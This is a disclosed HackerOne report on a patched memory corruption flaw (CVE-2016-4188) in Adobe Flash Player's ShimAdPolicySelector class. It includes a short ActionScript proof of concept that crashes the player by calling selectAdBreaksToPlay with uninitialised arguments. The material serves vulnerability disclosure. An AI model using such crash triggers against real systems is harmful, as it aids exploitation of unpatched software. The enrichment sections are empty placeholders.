---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '151040'
original_report_id: '151040'
title: Adobe Flash Player ShimAdPolicySelector(adPolicySelectorType=0) class Memory
  Corruption
weakness: Memory Corruption - Generic
team_handle: ibb
created_at: '2016-07-13T02:47:16.953Z'
disclosed_at: '2019-11-12T09:42:05.083Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
asset_identifier: IBB (Legacy)
asset_type: OTHER
max_severity: none
tags:
- hackerone
- memory-corruption-generic
---

# Adobe Flash Player ShimAdPolicySelector(adPolicySelectorType=0) class Memory Corruption

## Metadata

- HackerOne Report ID: 151040
- Weakness: Memory Corruption - Generic
- Program: ibb
- Disclosed At: 2019-11-12T09:42:05.083Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I. Summary
Adobe Flash Player is prone to a vulnerability which leads to memory corruption because of improper validation of ShimAdPolicySelector.selectAdBreaksToPlay().
------------------------------------------------------------------
II. Description
Normally, selectAdBreaksToPlay() should validate its parameter returns error in AS3 level if anything goes wrong.
However, if ShimAdPolicySelector is constructed with adPolicySelectorType=0, then invoking selectAdBreaksToPlay() with invalid AdPolicyInfo instance, some inner fields of ShimAdPolicySelector will be absent, which will cause a memory crash.

POC Source Code:

package
{	
	import com.adobe.tvsdk.mediacore.MediaPlayerItem;
	import com.adobe.tvsdk.mediacore.timeline.advertising.policy.AdPolicyInfo;
	import com.adobe.tvsdk.mediacore.timeline.advertising.policy.ShimAdPolicySelector;	
	import flash.display.Sprite;

	public class poc extends Sprite
	{
		public function poc()
		{
			var mp:MediaPlayerItem;
			var ap:AdPolicyInfo;
			var obj:ShimAdPolicySelector = new ShimAdPolicySelector(0,mp);
			obj.selectAdBreaksToPlay(ap);
		}		
	}
}
------------------------------------------------------------------
III. Impact
Memory Corruption
------------------------------------------------------------------
IV. Affected
Adobe Flash Player 21.0.0.242.
------------------------------------------------------------------
V. Credit
Wen Guanxing from Pangu LAB is credited for this vulnerability.

It has been assigned as CVE-2016-4188 by Adobe:
https://helpx.adobe.com/security/products/flash-player/apsb16-25.html

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
